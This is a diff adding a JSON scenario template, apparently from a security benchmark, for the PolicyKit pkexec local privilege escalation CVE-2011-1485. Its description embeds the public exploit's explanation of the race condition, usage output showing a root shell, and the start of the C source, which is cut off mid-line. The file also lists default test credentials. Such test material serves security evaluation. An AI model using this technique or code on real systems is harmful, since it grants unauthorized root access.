@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_17932",
+  "category": "A4_polkit",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: PolicyKit polkit-1 < 0.101 - Local Privilege Escalation (CVE-2011-1485;OSVDB-72261)\n\nExploit source code (17932.c):\n```\n/* polkit-pwnage.c\n *\n *\n * ==============================\n * =      PolicyKit Pwnage      =\n * =          by zx2c4          =\n * =        Sept 2, 2011        =\n * ==============================\n *\n *\n * Howdy folks,\n *\n * This exploits CVE-2011-1485, a race condition in PolicyKit.\n *\n * davidz25 explains:\n *\n * --begin--\n * Briefly, the problem is that the UID for the parent process of pkexec(1) is\n * read from /proc by stat(2)'ing /proc/PID. The problem with this is that\n * this returns the effective uid of the process which can easily be set to 0\n * by invoking a setuid-root binary such as /usr/bin/chsh in the parent\n * process of pkexec(1). Instead we are really interested in the real-user-id.\n * While there's a check in pkexec.c to avoid this problem (by comparing it to\n * what we expect the uid to be - namely that of the pkexec.c process itself which\n * is the uid of the parent process at pkexec-spawn-time), there is still a short\n * window where an attacker can fool pkexec/polkitd into thinking that the parent\n * process has uid 0 and is therefore authorized. It's pretty hard to hit this\n * window - I actually don't know if it can be made to work in practice.\n * --end--\n *\n * Well, here is, in fact, how it's made to work in practice. There is as he said an\n * attempted mitigation, and the way to trigger that mitigation path is something\n * like this:\n *\n *     $ sudo -u `whoami` pkexec sh\n *     User of caller (0) does not match our uid (1000)\n *\n * Not what we want. So the trick is to execl to a suid at just the precise moment\n * /proc/PID is being stat(2)'d. We use inotify to learn exactly when it's accessed,\n * and execl to the suid binary as our very next instruction.\n *\n * ** Usage **\n * $ pkexec --version\n * pkexec version 0.101\n * $ gcc polkit-pwnage.c -o pwnit\n * $ ./pwnit\n * [+] Configuring inotify for proper pid.\n * [+] Launching pkexec.\n * sh-4.2# whoami\n * root\n * sh-4.2# id\n * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)\n * sh-4.2#\n *\n * ** Targets **\n * This exploit is known to work on polkit-1 <= 0.101. However, Ubuntu, which\n * as of writing uses 0.101, has backported 0.102's bug fix. A way to check\n * this is by looking at the mtime of /usr/bin/pkexec -- April 22, 2011 or\n * later and you're out of luck. It's likely other distributions do the same.\n * Fortunately, this exploit is clean enough that you can try it out without\n * too much collateral.\n *\n *\n * greets to djrbliss and davidz25.\n *\n * - zx2c4\n * 2-sept-2011\n *\n */\n\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/inotify.h>\n\nint main(int argc, char **argv)\n{\n\tprintf(\"=============================\\n\");\n\tprintf(\"=      PolicyKit Pwnage     =\\n\");\n\tprintf(\"=          by zx2c4         =\\n\");\n\tprintf(\"=        Sept 2, 2011       =\\n\");\n\tprintf(\"=============================\\n\\n\");\n\n\tif (fork()) {\n\t\tint fd;\n\t\tchar pid_path[1024];\n\t\tsprintf(pid_path, \"/proc/%i\", getpid());\n\t\tprin\n```",
+  "cve": "CVE-2011-1485;OSVDB-72261",
+  "exploitdb_id": "17932",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_17932",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
